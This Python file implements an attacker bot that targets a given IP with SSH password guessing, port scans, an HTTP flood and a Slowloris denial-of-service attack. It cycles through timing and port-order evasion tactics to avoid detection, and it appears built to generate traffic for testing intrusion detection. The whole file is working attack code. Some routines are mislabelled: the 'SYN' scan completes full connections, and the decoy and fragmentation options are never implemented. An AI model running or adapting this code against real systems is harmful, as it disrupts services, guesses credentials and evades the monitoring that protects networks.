"""Attacker bot with multiple attack strategies and evasion adaptation."""

import socket
import time
import random
from dataclasses import dataclass, field
from enum import Enum
from typing import Optional


class AttackStrategy(Enum):
    SSH_BRUTEFORCE = "ssh_bruteforce"
    PORT_SCAN_SEQUENTIAL = "port_scan_sequential"
    PORT_SCAN_RANDOM = "port_scan_random"
    HTTP_FLOOD = "http_flood"
    SLOW_LORIS = "slow_loris"
    SYN_SCAN_STEALTH = "syn_scan_stealth"
    TIMING_EVASION_SCAN = "timing_evasion_scan"
    DECOY_SCAN = "decoy_scan"
    FRAGMENTED_SCAN = "fragmented_scan"


class EvasionTactic(Enum):
    NONE = "none"
    RANDOM_TIMING = "random_timing"
    SLOW_TIMING = "slow_timing"
    DECOY_SOURCES = "decoy_sources"
    SOURCE_PORT_MANIPULATION = "source_port_manipulation"
    RANDOMIZE_PORT_ORDER = "randomize_port_order"
    FRAGMENT_PACKETS = "fragment_packets"


STRATEGY_CHAIN = {
    AttackStrategy.SSH_BRUTEFORCE: [EvasionTactic.RANDOM_TIMING, EvasionTactic.SLOW_TIMING],
    AttackStrategy.PORT_SCAN_SEQUENTIAL: [
        EvasionTactic.RANDOM_TIMING,
        EvasionTactic.RANDOMIZE_PORT_ORDER,
        EvasionTactic.SLOW_TIMING,
        EvasionTactic.DECOY_SOURCES,
    ],
    AttackStrategy.PORT_SCAN_RANDOM: [
        EvasionTactic.SLOW_TIMING,
        EvasionTactic.SOURCE_PORT_MANIPULATION,
        EvasionTactic.FRAGMENT_PACKETS,
    ],
    AttackStrategy.HTTP_FLOOD: [
        EvasionTactic.RANDOM_TIMING,
        EvasionTactic.SLOW_TIMING,
    ],
    AttackStrategy.SYN_SCAN_STEALTH: [
        EvasionTactic.RANDOMIZE_PORT_ORDER,
        EvasionTactic.SLOW_TIMING,
        EvasionTactic.DECOY_SOURCES,
    ],
}


@dataclass
class AttackResult:
    strategy: AttackStrategy
    evasion: EvasionTactic
    detected: bool
    duration_sec: float
    flows_generated: int
    metadata: dict = field(default_factory=dict)


class AttackerBot:
    def __init__(self, target_ip: str, target_ports: list[int] = None):
        self.target_ip = target_ip
        self.target_ports = target_ports or [22, 80, 443, 21, 25, 3389, 8080, 8443, 53, 110]
        self._evasion_index: dict[AttackStrategy, int] = {}

    def get_next_evasion(self, strategy: AttackStrategy) -> Optional[EvasionTactic]:
        chain = STRATEGY_CHAIN.get(strategy, [])
        idx = self._evasion_index.get(strategy, 0)
        if idx >= len(chain):
            return None
        self._evasion_index[strategy] = idx + 1
        return chain[idx]

    def reset_strategy(self, strategy: AttackStrategy):
        self._evasion_index[strategy] = 0

    def _get_timing(self, evasion: EvasionTactic) -> float:
        if evasion == EvasionTactic.SLOW_TIMING:
            return random.uniform(2.0, 8.0)
        elif evasion == EvasionTactic.RANDOM_TIMING:
            return random.uniform(0.1, 3.0)
        return 0.05

    def _run_ssh_bruteforce(self, evasion: EvasionTactic) -> int:
        passwords = ["admin", "password", "123456", "root", "toor", "test", "guest"]
        flows = 0
        for pwd in passwords:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((self.target_ip, 22))
                banner = sock.recv(1024)
                sock.send(f"root {pwd}\r\n".encode())
                sock.close()
                flows += 1
            except Exception:
                flows += 1
            time.sleep(self._get_timing(evasion))
        return flows

    def _run_port_scan(self, evasion: EvasionTactic, sequential: bool = True) -> int:
        ports = list(self.target_ports) if sequential else random.sample(self.target_ports, len(self.target_ports))

        if evasion == EvasionTactic.RANDOMIZE_PORT_ORDER:
            random.shuffle(ports)

        source_port = None
        if evasion == EvasionTactic.SOURCE_PORT_MANIPULATION:
            source_port = random.randint(1024, 65535)

        flows = 0
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                if source_port:
                    sock.bind(("", source_port))
                    source_port += 1
                sock.connect((self.target_ip, port))
                sock.close()
                flows += 1
            except Exception:
                flows += 1
            time.sleep(self._get_timing(evasion))
        return flows

    def _run_http_flood(self, evasion: EvasionTactic) -> int:
        flows = 0
        for _ in range(50):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.target_ip, 80))
                sock.send(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n")
                sock.recv(1024)
                sock.close()
                flows += 1
            except Exception:
                flows += 1
            time.sleep(self._get_timing(evasion))
        return flows

    def _run_slow_loris(self, evasion: EvasionTactic) -> int:
        sockets = []
        for _ in range(20):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((self.target_ip, 80))
                sock.send(b"GET / HTTP/1.1\r\nHost: target\r\n")
                sockets.append(sock)
            except Exception:
                pass
            time.sleep(self._get_timing(evasion))

        for i in range(5):
            for sock in sockets:
                try:
                    sock.send(f"X-Padding-{i}: {'a'*10}\r\n".encode())
                except Exception:
                    pass
            time.sleep(self._get_timing(evasion))

        for sock in sockets:
            try:
                sock.close()
            except Exception:
                pass
        return len(sockets)

    def _run_syn_scan_stealth(self, evasion: EvasionTactic) -> int:
        """Socket-based stealth scan (SYN probes without completing handshake)."""
        ports = list(self.target_ports)
        if evasion == EvasionTactic.RANDOMIZE_PORT_ORDER:
            random.shuffle(ports)

        source_port = 0
        if evasion == EvasionTactic.SOURCE_PORT_MANIPULATION:
            source_port = random.randint(40000, 60000)

        flows = 0
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                if source_port:
                    try:
                        sock.bind(("", source_port))
                        source_port += 1
                    except Exception:
                        pass
                sock.connect_ex((self.target_ip, port))
                sock.close()
                flows += 1
            except Exception:
                flows += 1
            time.sleep(self._get_timing(evasion))
        return flows

    def execute_attack(self, strategy: AttackStrategy, evasion: EvasionTactic = EvasionTactic.NONE) -> AttackResult:
        start = time.time()

        if strategy == AttackStrategy.SSH_BRUTEFORCE:
            flows = self._run_ssh_bruteforce(evasion)
        elif strategy == AttackStrategy.PORT_SCAN_SEQUENTIAL:
            flows = self._run_port_scan(evasion, sequential=True)
        elif strategy == AttackStrategy.PORT_SCAN_RANDOM:
            flows = self._run_port_scan(evasion, sequential=False)
        elif strategy == AttackStrategy.HTTP_FLOOD:
            flows = self._run_http_flood(evasion)
        elif strategy == AttackStrategy.SLOW_LORIS:
            flows = self._run_slow_loris(evasion)
        elif strategy == AttackStrategy.SYN_SCAN_STEALTH:
            flows = self._run_syn_scan_stealth(evasion)
        else:
            flows = self._run_port_scan(evasion, sequential=True)

        duration = time.time() - start
        return AttackResult(
            strategy=strategy,
            evasion=evasion,
            detected=False,
            duration_sec=duration,
            flows_generated=flows,
            metadata={"target": self.target_ip},
        )
